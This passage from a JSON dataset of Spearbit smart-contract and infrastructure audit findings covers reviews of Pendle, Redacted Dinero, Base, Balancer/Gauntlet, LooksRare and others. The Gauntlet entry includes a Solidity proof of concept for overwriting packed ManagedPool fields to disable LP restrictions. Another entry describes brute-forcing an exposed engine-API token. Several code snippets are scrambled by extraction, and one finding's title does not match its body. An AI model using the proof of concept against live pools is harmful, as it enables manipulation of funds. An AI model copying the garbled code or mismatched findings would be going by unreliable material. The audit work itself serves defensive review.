        "body": "The following check cannot be triggered since the newExchangeRate cannot be less than PMath.IONE.  MarketMathCore.sol#L312-L314: int256 newExchangeRate = _getExchangeRateFromImpliedRate(lastLnImpliedRate, timeToExpiry); if (newExchangeRate < PMath.IONE) revert Errors.MarketExchangeRateBelowOne(newExchangeRate); The newExchangeRate is computed as follows, where always rt >= 0 due to being unsigned.  MarketMathCore.sol#L345-L352: function _getExchangeRateFromImpliedRate( uint256 lnImpliedRate, uint256 timeToExpiry ) internal pure returns (int256 exchangeRate) { uint256 rt = (lnImpliedRate * timeToExpiry) / IMPLIED_RATE_TIME; exchangeRate = LogExpMath.exp(rt.Int()); } In the worst case, rt == 0 and therefore exchangeRate == PMath.IONE. Consequently, the above instance of the MarketExchangeRateBelowOne error can never be reached.",
        "labels": [
            "Spearbit",
            "Pendle",
            "Severity: Informational"
        ]
    },
    {
        "title": "LP valuation can be understated if YT caches index updates",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Pendle-Spearbit-Security-Review-July-2024.pdf",
        "body": "When expiry <= block.timestamp and syIndex > pyIndex, while YT.doCacheIndexSameBlock() && YT.pyIndexLastUpdatedBlock() == block.number, it will be totalHypotheticalAsset = state.totalPt + state.totalSy * pyIndex / ONE:  PendleLpOracleLib.sol#L52-L54: if (state.expiry <= block.timestamp) { // 1 PT = 1 Asset post-expiry totalHypotheticalAsset = state.totalPt + PYIndexLib.syToAsset(PYIndex.wrap(pyIndex), ,! state.totalSy);  PYIndex.sol#L19-L21: function syToAsset(PYIndex index, uint256 syAmount) internal pure returns (uint256) { return SYUtils.syToAsset(PYIndex.unwrap(index), syAmount); }  SYUtils.sol#L7-L9: 13 function syToAsset(uint256 exchangeRate, uint256 syAmount) internal pure returns (uint256) { return (syAmount * exchangeRate) / ONE; } Then lpToAssetRateRaw = (state.totalPt + state.totalSy * pyIndex / ONE).divDown(state.totalLp):  PendleLpOracleLib.sol#L34-L39: function getLpToSyRate(IPMarket market, uint32 duration) internal view returns (uint256) { (uint256 syIndex, uint256 pyIndex) = PendlePtOracleLib.getSYandPYIndexCurrent(market); uint256 lpToAssetRateRaw = _getLpToAssetRateRaw(market, duration, pyIndex); if (syIndex >= pyIndex) { return lpToAssetRateRaw.divDown(syIndex); // << } and getLpToSyRate() returns (state.totalPt + state.totalSy * pyIndex / ONE).divDown(state.totalLp).divDown(syIndex). Simplifying and omitting rounding down, it is totalPt / syIndex + state.totalSy * pyIndex / syIndex, i.e. state.totalSy is weighted with pyIndex / syIndex < 1, underpricing the LP.",
        "labels": [
            "Spearbit",
            "Pendle",
            "Severity: Informational"
        ]
    },
    {
        "title": "Edge case handling in OracleLib",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Pendle-Spearbit-Security-Review-July-2024.pdf",
        "body": "In the OracleLib library contract, the following instances were uncovered where edge cases of public methods are not handled gracefully: 1. In the binarySearch() method, which searches for Oracle observations at a given timestamp, there is an infinite loop (while(true)) which can lead to a revert (out-of-gas) in case the desired target timestamp is newer/older than the stored observations. 2. In the getSurroundingObservations() method, which utilizes the aforementioned binarySearch() method to get Oracle observations around a given timestamp, there is an edge case where the desired target timestamp coincides with the most recent observation (beforeOrAt.blockTimestamp == target). However, in this case the method's second return value atOrAfter is left unset which could impact future integrations that directly rely on this method.",
        "labels": [
            "Spearbit",
            "Pendle",
            "Severity: Informational"
        ]
    },
    {
        "title": "Open ports to the internet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Redacted-Dinero-Infrastructure-Security-Review.pdf",
        "body": "The following ports will be open from the internet (0.0.0.0/0) and would allow anyone to access any service running under them.  443 tcp - https  9100-9104 tcp - beacon Node metrics port  9091 tcp - prometheus  3100 tcp - grafana  8545 tcp - execution layer rpc  9001 tcp - prometheus  5052 - beacon API",
        "labels": [
            "Spearbit",
            "Redacted-Dinero-Infrastructure-Security-Review.pd",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Docker container running as root",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Redacted-Dinero-Infrastructure-Security-Review.pdf",
        "body": "Docker containers run by default as root. privilege escalation. It is recommended to use a different user to prevent",
        "labels": [
            "Spearbit",
            "Redacted-Dinero-Infrastructure-Security-Review.pd",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Block depth used does not offer guarantees against reorgs under edge cases",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Redacted-Dinero-Infrastructure-Security-Review.pdf",
        "body": "The Ethereum chain finalizes roughly every 2 epochs (64 slots), at this point the network offers extreme guarantees for the finalized blocks. The current value of CONFIRMATION_BLOCKS=30 would be historically safe, but offers no guarantees in edge/attack cases against reorgs and non-finality incidents.",
        "labels": [
            "Spearbit",
            "Redacted-Dinero-Infrastructure-Security-Review.pd",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Updater misconfigured to check for a non-running container",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Redacted-Dinero-Infrastructure-Security-Review.pdf",
        "body": "The current running version is obtained by checking the status of a container named rocketpool_- node, but such a container would likely not exist. The name being checked should be renamed to ensure the updater works as expected.",
        "labels": [
            "Spearbit",
            "Redacted-Dinero-Infrastructure-Security-Review.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Docker base images should use a SHA256 or a fixed tagged version",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Redacted-Dinero-Infrastructure-Security-Review.pdf",
        "body": "The Dockerfile is using debian:bullseye-slim. Ideally a fixed version should be used so that the OS version is pinned. It's preferred to use a SHA256 of the image due to the fact that a tag could be re-uploaded. Note that the base image should still be updated from time to time to include the latest security fixes.",
        "labels": [
            "Spearbit",
            "Redacted-Dinero-Infrastructure-Security-Review.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "No security patching process",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Redacted-Dinero-Infrastructure-Security-Review.pdf",
        "body": "There's no process in place to automatically update the OS packages regarding security patches.",
        "labels": [
            "Spearbit",
            "Redacted-Dinero-Infrastructure-Security-Review.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Excessive linux permissions on directories",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Redacted-Dinero-Infrastructure-Security-Review.pdf",
        "body": "There are unnecessary write permissions given to +g and +o.",
        "labels": [
            "Spearbit",
            "Redacted-Dinero-Infrastructure-Security-Review.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Latest Linux Amazon 2 AMI used without hardening",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Redacted-Dinero-Infrastructure-Security-Review.pdf",
        "body": "The AMI used could be more hardened.",
        "labels": [
            "Spearbit",
            "Redacted-Dinero-Infrastructure-Security-Review.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "AWS Systems Management sessions are not logged",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Redacted-Dinero-Infrastructure-Security-Review.pdf",
        "body": "The sessiond creates via SSM are not being logged. It's recommended to keep an audit log of these sessions.",
        "labels": [
            "Spearbit",
            "Redacted-Dinero-Infrastructure-Security-Review.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "GET /validators endpoint on the API Gateway is not cached or throttled",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Redacted-Dinero-Infrastructure-Security-Review.pdf",
        "body": "The API endpoint that runs the /validators function could have some cache with a low TTL to avoid any external abuse of this API endpoint. An abuse could lead to unnecessary read operations and overload on the DynamoDB. The cache is recommended also to avoid increased cloud costs due to excessive lamba invocations and database read operations.",
        "labels": [
            "Spearbit",
            "Redacted-Dinero-Infrastructure-Security-Review.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Cubist policy suggestions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Redacted-Dinero-Infrastructure-Security-Review.pdf",
        "body": "Cubist allows setting policies that limit the scope of what a session can do.",
        "labels": [
            "Spearbit",
            "Redacted-Dinero-Infrastructure-Security-Review.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Cubist user session token cleanup",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Redacted-Dinero-Infrastructure-Security-Review.pdf",
        "body": "",
        "labels": [
            "Spearbit",
            "Redacted-Dinero-Infrastructure-Security-Review.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Besu is using sync mode X_CHECKPOINT",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Redacted-Dinero-Infrastructure-Security-Review.pdf",
        "body": "Checkpoint sync behaves like snap sync, but instead of syncing from the genesis block, it syncs from a specific checkpoint block configured in the Besu genesis file. To avoid trusting this checkpoint configuration, it's recommended to use snap sync.",
        "labels": [
            "Spearbit",
            "Redacted-Dinero-Infrastructure-Security-Review.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Lighthouse historic state cache increased",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Redacted-Dinero-Infrastructure-Security-Review.pdf",
        "body": "The historic state cache flag --historic-state-cache-size was increased from the default value 1 to 2. This will result in a higher use of memory.",
        "labels": [
            "Spearbit",
            "Redacted-Dinero-Infrastructure-Security-Review.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Runtime profiling tools enabled in Geth by default",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Redacted-Dinero-Infrastructure-Security-Review.pdf",
        "body": "The --pprof flag, which enables golang runtime profiling, is enabled. This has a performance impact and should only be enabled when debugging Geth.",
        "labels": [
            "Spearbit",
            "Redacted-Dinero-Infrastructure-Security-Review.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Dinero node version should use a fixed or tagged version instead of latest",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Redacted-Dinero-Infrastructure-Security-Review.pdf",
        "body": "The install.sh is using PACKAGE_VERSION=\"latest\". Ideally a fixed version should be used so that the release is pinned. Using latest obfuscates the version being used and can lead to config drift. Note that the base version should still be updated from time to time to include the latest security fixes.",
        "labels": [
            "Spearbit",
            "Redacted-Dinero-Infrastructure-Security-Review.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Metrics endpoint exposed globally leaking validating key information",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Redacted-Dinero-Infrastructure-Security-Review.pdf",
        "body": "The metrics feature of most clients reports the validators registered to said beacon node, especially when used alongside flags such as --validator-monitor-auto. In combination with accepting requests from the public internet (0.0.0.0/0) would imply that anyone can query the running validator keys on the host, which is information that is ideally not leaked.  Lighthouse  Lodestar  Nimbus 11  Prysm  Teku",
        "labels": [
            "Spearbit",
            "Redacted-Dinero-Infrastructure-Security-Review.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Node Engine-API configured to accept traffic from any IP range",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Redacted-Dinero-Infrastructure-Security-Review.pdf",
        "body": "The engine API will be open from the internet (0.0.0.0/0). The API does offer authentication in the form of JWT token, but there is no limit on the number of attempts. This means the token can be bruteforced in the current setup and would allow anyone to control the EL completely. This API can be used to fork the node or to completely stall it.  Geth  Nethermind  Besu",
        "labels": [
            "Spearbit",
            "Redacted-Dinero-Infrastructure-Security-Review.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Node JSON RPC/websocket configured to accept traffic from any IP range",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Redacted-Dinero-Infrastructure-Security-Review.pdf",
        "body": "The following API will be open from the internet (0.0.0.0/0) and would allow anyone to access any API endpoint running. This would lead to a possibility of DDoS attacks and downtime for the node and associated validator. This applies to both the HTTP as well as the Websocket connections.  Geth-RPC  Nethermind-RPC  Besu-RPC  Lighthouse-RPC  Lodestar-RPC  Nimbus-RPC  Prysm-RPC 12  Teku-RPC",
        "labels": [
            "Spearbit",
            "Redacted-Dinero-Infrastructure-Security-Review.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Fixed size root EBS volume",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Redacted-Dinero-Infrastructure-Security-Review.pdf",
        "body": "The VM uses a fixed size (200GB) root volume. To avoid problems with disk space limitations, it's recommended to create a separate volume for data. A separate \"data\" volume should make it easier to expand the volume in the future without having to touch the root volume.",
        "labels": [
            "Spearbit",
            "Redacted-Dinero-Infrastructure-Security-Review.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "IP Address of the EC2 instance could accidentally change",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Redacted-Dinero-Infrastructure-Security-Review.pdf",
        "body": "The instance doesn't have an Elastic IP associated. This means that if the instance is ever stopped, it will start up with a new IP address. This could be undesired.",
        "labels": [
            "Spearbit",
            "Redacted-Dinero-Infrastructure-Security-Review.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "check-unstake doesn't verify if the broadcast result of the voluntary_exit request got included",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Redacted-Dinero-Infrastructure-Security-Review.pdf",
        "body": "To exit, a request with a SignedVoluntaryExit object is sent to the beacon node via the beacon API. The node should then broadcast this to the network. In extreme cases, it could happen that this message fails to being gossiped across the network and the exit request is never seen.",
        "labels": [
            "Spearbit",
            "Redacted-Dinero-Infrastructure-Security-Review.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Function calling topUpStake doesn't wait for transaction receipt",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Redacted-Dinero-Infrastructure-Security-Review.pdf",
        "body": "The transaction is sent but the function doesn't wait for it to be included. This could give a false sense of a successful function run.",
        "labels": [
            "Spearbit",
            "Redacted-Dinero-Infrastructure-Security-Review.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "RPC / Beacon endpoints are not checked for correctness",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Redacted-Dinero-Infrastructure-Security-Review.pdf",
        "body": "Most of the functions use an RPC endpoint from a execution client or a beacon API endpoint from a consensus client. The endpoints are not validated for correctness.",
        "labels": [
            "Spearbit",
            "Redacted-Dinero-Infrastructure-Security-Review.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove unused events, enums, constants and errors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "Some events, enums, constants, and errors have been declared but are never used in the con- tract's functions, consider removing or using them.  Events: HumaConfig.ProtocolDefaultGracePeriodChanged, Credit.CreditInitiated, Credit.CreditLineChanged, Pool.PoolAssetsRefreshed.  Enums: CreditStructs.PaymentStatus, CreditStructs.CreditClosureReason.  Constants: SharedDefs.MAX_PERIODS, ReceivableFactoringCredit.PAYER_ROLE DurationTooLong,  Errors: match, NotTradableStreamOwner, tAvailableFlowRate, AuthorizationExpired, InvalidAuthorization, NewReceiverSameToOrigin. FlowKeyMis- InvalidSuperfluidAction, Insufficien- TradableStreamNotExisting, InvalidSuperfluidCallback, TradableStreamNotMatured, FlowIsNotTerminated, BorrowerMismatch, InvalidFlowRate, OnlySuperfluid,",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "FaultDisputeGame no existing tests for subgames resolution at the same leftmostPosition",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf",
        "body": "The resolution in the FaultDisputeGame follows the rule of the leftmost child subgame which is uncountered should win the subgame.   // If the child subgame is uncountered and further left than the current left-most counter, // update the parent subgame // The left-most correct counter is preferred in bond payouts in order to discourage attackers // from countering invalid subgame roots via an invalid defense position. As such positions // cannot be correctly countered. // Note that correctly positioned defense, but invalid claimes can still be successfully countered. if (claim.counteredBy == address(0) && checkpoint.leftmostPosition.raw() > claim.position.raw()) { address and the current leftmostCounter countered    s . checkpoint.counteredBy = claim.claimant; checkpoint.leftmostPosition = claim.position; } In case multiple child subgames exists at the same position.raw the one with a lower index in challengeIndices would be iterated first by the loop and would be considered. uint256[] storage challengeIndices = subgames[_claimIndex]; Therefore, the honest challenger should always continue to play with the leftmost position, if at the same position the child subgame with a lower challengeIndices. However, this part doesn't seem to be tested. The condition can be changed to the opposite (The one with the highest challengeIndices should win if the position is the same, the loop would overwrite the checkpoint for the same position). - if (claim.counteredBy == address(0) && checkpoint.leftmostPosition.raw() = claim.position.raw()) + if (claim.counteredBy == address(0) && checkpoint.leftmostPosition.raw() >= claim.position.raw()) All tests would still pass.",
        "labels": [
            "Spearbit",
            "Base",
            "Severity: Informational"
        ]
    },
    {
        "title": "FaultDisputeGame.step incorrect comment about number of leaves calculation for each execution trace subgame",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf",
        "body": "The comment preStateClaim for the leftmost leaf of each execution trace subgame. in FaultDisputeGame.sol incorrectly describes the condition for determining 18  s index at depth is 0, the prestate is the absolute // If the step position // prestate. // If the step is an attack at a trace index > 0, the prestate exists elsewhere in // the game state. // NOTE: We localize the // // // preStateClaim = (stepPos.indexAtDepth() % (1 << (MAX_GAME_DEPTH - SPLIT_DEPTH))) == 0 ? ABSOLUTE_PRESTATE : _findTraceAncestor(Position.wrap(parentPos.raw() - 1), parent.parentIndex, false).claim; the remainder of the index at depth divided by 2 ** (MAX_GAME_DEPTH - SPLIT_DEPTH), which is the number of leaves in each execution trace subgame. This is so that we can determine whether or not the step position is represents the for the current execution trace subgame by finding ABSOLUTE_PRESTATE indexAtDepth  .    The correct calculation for the number of leaves in the execution trace trees should be: (1 << (MAX_GAME_DEPTH - SPLIT_DEPTH - 1)) The execution trace roots are located at SPLIT_DEPTH + 1, making the current calculation (1 << (MAX_GAME_- DEPTH - SPLIT_DEPTH)) double the actual number of leaf nodes. However, the stepPos here is already one level below the MAX_GAME_DEPTH at MAX_GAME_DEPTH + 1. The current implementation works correctly because the stepPos in an attack case is double the parentPos. // gindex of nextStep in attack scenario stepPos = parentPos * 2; Therefore, the left and right side of the modulo operator will be double the amount and compute the correct result in the modulo equals zero case. Example: For MAX_GAME_DEPTH = 4 and SPLIT_DEPTH = 2:  Correct number of leaves: 2 ** (4-2-1) = 2 and not 4.  Current implementation works correctly because (x % 2) == (2x % 4) holds true if x % 2 == 0. General Form x mod y = (2x) mod (2y) The condition holds true if and only if x mod y = 0.",
        "labels": [
            "Spearbit",
            "Base",
            "Severity: Informational"
        ]
    },
    {
        "title": "Important Balancer fields can be overwritten by EndTime",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "Balancers ManagedPool uses 32 bit values for startTime and endTime but it does not verify if those values exist within that range. Values are stored in a 32-byte _miscData slot in BasePool via the insertUint32() function. Nevertheless, this function does not strip any excess bits, resulting in other fields stored in _miscData to be overwritten. In the version that Aera Vault uses only the \"restrict LP\" field can be overwritten and by carefully crafting the value of endTime, the \"restrict LP\" boolean can be switched off, allowing anyone to use joinPool. The Manager could cause this behavior via the updateWeightsGradually() function while the Owner could do it via enableTradingWithWeights(). Note: This issue has been reported to Balancer by the Spearbit team. contract ManagedPool is BaseWeightedPool, ReentrancyGuard { // f14de92ac443d6daf1f3a42025b1ecdb8918f22e 32 bits | 1 bit 1 bit | | | restrict LP | end time 32 bits | ] 7 bits | start time | total tokens | swap flag ] // [ 64 bits // [ reserved | // |MSB | 119 bits | unused function _startGradualWeightChange(uint256 startTime, uint256 endTime, ... ) ... { ... _setMiscData( _getMiscData().insertUint32(startTime, _START_TIME_OFFSET).insertUint32(endTime, ,! _END_TIME_OFFSET) ); // this convert the values to 32 bits ... } } In the latest version of ManagedPool many more fields can be overwritten, including:  LP flag  Fee end/Fee start  Swap flag contract ManagedPool is BaseWeightedPool, AumProtocolFeeCache, ReentrancyGuard { // current version // [ 64 bits ] // [ swap fee | LP flag | fee end | swap flag | fee start | end swap | end wgt | start wgt ] LSB| // |MSB 1 bit | 31 bits | | 31 bits 64 bits | 32 bits | 32 bits 1 bit | | The following POC shows how fields can be manipulated. // SPDX-License-Identifier: MIT pragma solidity ^0.8.13; import \"hardhat/console.sol\"; contract checkbalancer { uint256 private constant _MASK_1 = 2**(1) - 1; uint256 private constant _MASK_31 = 2**(31) - 1; uint256 private constant _MASK_32 = 2**(32) - 1; uint256 private constant _MASK_64 = 2**(64) - 1; uint256 private constant _MASK_192 = 2**(192) - 1; 5 | | 1 bit 64 bits | | 31 bits 1 bit | 31 bits | // [ 64 bits ] // [ swap fee | LP flag | fee end | swap flag | fee start | end swap | end wgt | start wgt ] LSB| // |MSB uint256 private constant _WEIGHT_START_TIME_OFFSET = 0; uint256 private constant _WEIGHT_END_TIME_OFFSET = 32; uint256 private constant _END_SWAP_FEE_PERCENTAGE_OFFSET = 64; uint256 private constant _FEE_START_TIME_OFFSET = 128; uint256 private constant _SWAP_ENABLED_OFFSET = 159; uint256 private constant _FEE_END_TIME_OFFSET = 160; uint256 private constant _MUST_ALLOWLIST_LPS_OFFSET = 191; uint256 private constant _SWAP_FEE_PERCENTAGE_OFFSET = 192; 32 bits | 32 bits function insertUint32(bytes32 word,uint256 value,uint256 offset) internal pure returns (bytes32) { bytes32 clearedWord = bytes32(uint256(word) & ~(_MASK_32 << offset)); return clearedWord | bytes32(value << offset); } function decodeUint31(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_31; } function decodeUint32(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_32; } function decodeUint64(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_64; } function decodeBool(bytes32 word, uint256 offset) internal pure returns (bool) { return (uint256(word >> offset) & _MASK_1) == 1; } function insertBits192(bytes32 word,bytes32 value,uint256 offset) internal pure returns (bytes32) { bytes32 clearedWord = bytes32(uint256(word) & ~(_MASK_192 << offset)); return clearedWord | bytes32((uint256(value) & _MASK_192) << offset); } constructor() { bytes32 poolState; bytes32 miscData; uint startTime = 1 + 2*2**32; uint endTime = 3 + 4*2**32 + 5*2**(32+64) + 2**(32+64+31) + 6*2**(32+64+31+1) + ,! 2**(32+64+31+1+31) + 7*2**(32+64+31+1+31+1); poolState = insertUint32(poolState,startTime, _WEIGHT_START_TIME_OFFSET); poolState = insertUint32(poolState,endTime, _WEIGHT_END_TIME_OFFSET); miscData = insertBits192(miscData,poolState,0); decodeUint32(miscData, console.log(\"startTime\", console.log(\"endTime\", decodeUint32(miscData, console.log(\"endSwapFeePercentage\", decodeUint64(miscData, _WEIGHT_START_TIME_OFFSET)); // 1 // 3 _WEIGHT_END_TIME_OFFSET)); _END_SWAP_FEE_PERCENTAGE_OFFSET)); ,! // 4 console.log(\"Fee startTime\", console.log(\"Swap enabled\", console.log(\"Fee endTime\", console.log(\"AllowlistLP\", decodeUint31(miscData, decodeBool(miscData, decodeUint31(miscData, decodeBool(miscData, _FEE_START_TIME_OFFSET)); // 5 _SWAP_ENABLED_OFFSET)); // true _FEE_END_TIME_OFFSET)); // 6 _MUST_ALLOWLIST_LPS_OFFSET)); // ,! true console.log(\"Swap fee percentage\", console.log(\"Swap fee percentage\", decodeUint64(poolState, _SWAP_FEE_PERCENTAGE_OFFSET)); // 7 _SWAP_FEE_PERCENTAGE_OFFSET)); // 0 decodeUint64(miscData, due to miscData conversion } ,! }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Duplicated functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "_getStoppedValidatorsCountFromRawArray functions are the same. Operator.2._getStoppedValidatorCountAtIndex The and OperatorsRegistry.1. 30 function _getStoppedValidatorCountAtIndex(uint32[] storage stoppedValidatorCounts, uint256 if (index + 1 >= stoppedValidatorCounts.length) { return 0; } return stoppedValidatorCounts[index + 1]; function _getStoppedValidatorsCountFromRawArray(uint32[] storage stoppedValidatorCounts, internal view returns (uint32) index) File: Operators.2.sol 142: ,! 143: 144: 145: 146: 147: 148: 149: 150: 151: } { uint256 operatorIndex) internal view returns (uint32) File: OperatorsRegistry.1.sol 484: ,! 485: 486: 487: 488: 489: 490: 491: 492: 493: return 0; } { if (operatorIndex + 1 >= stoppedValidatorCounts.length) { } return stoppedValidatorCounts[operatorIndex + 1];",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Keep maximum allowed number of characters per line to 120.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "There are a few long lines in the code base. contracts/executionStrategies/StrategyCollectionOffer.sol 21:2 27:2 29:2 30:2 67:2 69:2 70:2 118:2 119:2 error error error error error error error error error Line length must be no more than 120 but current length is 127 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length contracts/executionStrategies/StrategyDutchAuction.sol 20:2 22:2 23:2 26:5 70:31 85:2 86:2 92:5 error error error warning warning error error warning Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 9 but allowed no more than 7 Avoid to make time-based decisions in your business logic Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 8 but allowed no more than 7 max-line-length max-line-length max-line-length code-complexity not-rely-on-time max-line-length max-line-length code-complexity contracts/executionStrategies/StrategyItemIdsRange.sol 15:2 20:2 21:2 22:2 23:2 25:5 100:2 101:2 error error error error error warning error error Line length must be no more than 120 but current length is 142 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 12 but allowed no more than 7 Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 max-line-length max-line-length max-line-length max-line-length max-line-length code-complexity max-line-length max-line-length contracts/helpers/OrderValidatorV2A.sol 40:2 ,! 53:2 ,! error Line length must be no more than 120 but current length is 121 error Line length must be no more than 120 but current length is 121 max-line-length max-line-length 69 225:2 ,! 279:2 ,! 498:24 ,! 501:26 ,! 511:2 ,! 593:5 ,! 662:5 ,! 758:5 ,! 830:5 ,! 843:17 ,! 850:17 ,! 906:5 ,! 963:5 ,! 12:2 ,! 18:2 ,! 23:2 ,! 49:5 ,! 81:2 ,! 144:2 ,! error Line length must be no more than 120 but current length is 127 max-line-length error Line length must be no more than 120 but current length is 127 max-line-length warning Avoid to make time-based decisions in your business logic not-rely-on-time warning Avoid to make time-based decisions in your business logic not-rely-on-time error Line length must be no more than 120 but current length is 143 max-line-length warning Function has cyclomatic complexity 9 but allowed no more than 7 warning Function has cyclomatic complexity 9 but allowed no more than 7 code-complexity code-complexity warning Function order is incorrect, internal view function can not go after internal pure function (line 727) ordering warning Function has cyclomatic complexity 10 but allowed no more than 7 code-complexity warning Avoid to use inline assembly. It is acceptable only in rare cases no-inline-assembly warning Avoid to use inline assembly. It is acceptable only in rare cases warning Function has cyclomatic complexity 8 but allowed no more than 7 no-inline-assembly warning Function has cyclomatic complexity 8 but allowed no more than 7 code-complexity code-complexity contracts/helpers/ValidationCodeConstants.sol 17:2 18:2 error error Line length must be no more than 120 but current length is 129 Line length must be no more than 120 but current length is 121 max-line-length max-line-length contracts/interfaces/ILooksRareProtocol.sol 160:2 error Line length must be no more than 120 but current length is 122 max-line-length contracts/libraries/OrderStructs.sol error Line length must be no more than 120 but current length is 292 max-line-length error Line length must be no more than 120 but current length is 292 max-line-length error Line length must be no more than 120 but current length is 127 max-line-length warning Function order is incorrect, struct definition can not go after state variable declaration (line 26) ordering error Line length must be no more than 120 but current length is 128 max-line-length error Line length must be no more than 120 but current length is 131 max-line-length 49 problems (34 errors, 15 warnings)",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unchecked arithmetic can be used for gas optimizations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "Unchecked operations may be applied in certain areas where it's known not to overflow/underflow. Therefore, if already exists a check that a > b or a >= b, it is safe to assume than a - b would be safe. Addition- ally, uint256 counters are likely to never reach the maximum value.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Gas Optimization HyperdriveFactory.sol#L637, HyperdriveFactory.sol#L794, HyperdriveFactory.sol#L834,"
        ]
    },
    {
        "title": "MemoryStateDB contains data race in DeleteState()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/report-blast-node-review-draft.pdf",
        "body": "Checks have been added for i[\"Shares\"][\"price\"], i[\"Gas\"][\"baseClaimRate\"], and i[\"L2BlastBridge\"][\"otherBridge\"]. However, the following news blast fields still do not have a check: the following additional fields added by blast:",
        "labels": [
            "Spearbit",
            "report-blast-node-review-draft.pd",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "FaultDisputeGame.step incorrect comment about number of leaves calculation for each execution trace subgame",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf",
